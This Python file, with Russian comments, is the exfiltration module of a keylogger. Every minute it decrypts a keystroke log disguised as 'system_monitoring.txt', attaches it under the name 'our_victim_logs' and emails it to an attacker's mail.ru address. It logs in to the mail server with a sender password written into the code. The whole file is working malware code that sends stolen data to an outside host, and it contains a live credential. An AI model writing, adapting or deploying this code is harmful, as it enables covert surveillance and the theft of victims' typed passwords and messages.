"""ФАЙЛ ПО СОЗДАНИЮ ОТПРАВКИ ЛОГОВ НА ПОЧТУ"""
import os
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import schedule
from decryption import main_dcrp
from encryption import main_ecrp


# функция отправления электронного письма
def send_email(file_path):

    # отправитель
    sender = "keyloger_sender@mail.ru"
    password = "6uyxsp5pdvaRHjPCJa5Y"
    # получатель
    recipient = "keyloger_recipient@mail.ru"

    # SMTP-сервер
    server = smtplib.SMTP('smtp.mail.ru', 587)
    server.starttls()
    server.login(sender, password)

    main_dcrp()

    msg = MIMEMultipart()
    msg['Subject'] = "keyloger"
    msg['From'] = sender
    msg['To'] = recipient

    # Присоединяем текстовое сообщение
    msg.attach(MIMEText("См. вложение для логов.", 'plain'))

    # Открываем файл и прикрепляем его как вложение
    with open(file_path, "rb") as file:
        part = MIMEApplication(file.read())
        part.add_header('Content-Disposition', 'attachment', filename="our_victim_logs")
        msg.attach(part)

    server.sendmail(sender, recipient, msg.as_string())
    print('Файл успешно отправлен!')
    main_ecrp()
    server.quit()


# Функция выполнения расписания
def run_schedule(file_path):
    schedule.every(1).minutes.do(send_email, file_path)

    while True:
        schedule.run_pending()
        time.sleep(1)


def main():
    # путь к файлу с кейлогами
    file_name = 'system_monitoring.txt'
    current_directory = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_directory, file_name)

    # Запуск выполнения расписания
    run_schedule(file_path)
